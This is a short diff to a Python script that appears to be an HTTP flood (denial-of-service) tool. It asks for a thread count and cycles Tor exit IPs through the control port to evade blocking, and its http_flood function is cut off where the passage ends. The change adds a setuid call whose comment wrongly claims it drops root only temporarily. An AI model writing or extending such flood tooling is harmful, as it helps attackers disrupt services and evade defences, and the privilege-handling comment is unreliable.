@@ -17,14 +17,18 @@ THREADS = int(input("Enter number of threads: "))
 IP_ROTATION_INTERVAL = int(input("Enter Tor IP rotation interval (seconds): "))
 USE_TOR = input("Use Tor for IP rotation? (y/n): ").strip().lower() == 'y'
 # =================================
+import os
 
 def rotate_tor_ip():
+    # Drop privileges to access Tor control as your normal user
+    os.setuid(os.getuid())  # Drop root temporarily
     with Controller.from_port(port=9051) as controller:
         controller.authenticate(password=TOR_PASSWORD)
         while True:
             controller.signal(Signal.NEWNYM)
             print("[*] Tor IP rotated.")
             time.sleep(IP_ROTATION_INTERVAL)
+
 
 def http_flood():
     while True:
